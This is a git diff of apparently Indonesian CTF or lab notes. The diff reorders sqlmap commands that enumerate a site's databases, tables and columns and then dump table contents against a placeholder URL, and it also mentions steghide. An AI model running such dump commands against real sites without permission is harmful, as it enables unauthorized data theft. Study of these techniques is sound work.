@@ -55,40 +55,41 @@ steghide extract -sf Galaksi.jpg
 
 **Database :**
 
-![image](https://github.com/stinkmtul/test/assets/123925640/9f23d015-0e65-4ff0-9e82-5d6fb7d3de9d)
-
 
 sqlmap -u linkwebsite --dbs, maka akan muncul database yang digunakan dari website tersebut
 
+![image](https://github.com/stinkmtul/test/assets/123925640/9f23d015-0e65-4ff0-9e82-5d6fb7d3de9d)
+
+
 
 **Kolom :**
+
+sqlmap -u linkwebsite -D namadatabase -columns 
 
 ![image](https://github.com/stinkmtul/test/assets/123925640/46f13576-f159-446b-af88-655645729bca)
 
 ![image](https://github.com/stinkmtul/test/assets/123925640/81dbcdcd-4866-462c-83d4-a422f0fd16ec)
 
 
-sqlmap -u linkwebsite -D namadatabase -columns 
-
 
 **Tabel :**
+
+sqlmap -u linkwebsite -D namadatabase -columns -T namatabel
 
 ![image](https://github.com/stinkmtul/test/assets/123925640/a9b0af87-ef23-4a64-81b2-d0260d7ccedc)
 
 ![image](https://github.com/stinkmtul/test/assets/123925640/5f334835-2bd4-41b4-b0ff-372025cf1301)
 
 
-sqlmap -u linkwebsite -D namadatabase -columns -T namatabel
-
 
 **Dumpdata :**
+
+sqlmap -u linkwebsite -D namadatabase -columns -T namatabel -C namakolom --dump, ini akan memunculkan isi dari tabel
 
 ![image](https://github.com/stinkmtul/test/assets/123925640/5b71b523-a02b-4fb5-a58d-1d7f20a84de4)
 
 
 ![image](https://github.com/stinkmtul/test/assets/123925640/f3c07f92-e99a-4a1c-80be-cd0ce87b21a1)
-
-sqlmap -u linkwebsite -D namadatabase -columns -T namatabel -C namakolom --dump, ini akan memunculkan isi dari tabel
 
 # Website decrpyt
 https://dencode.com/en/
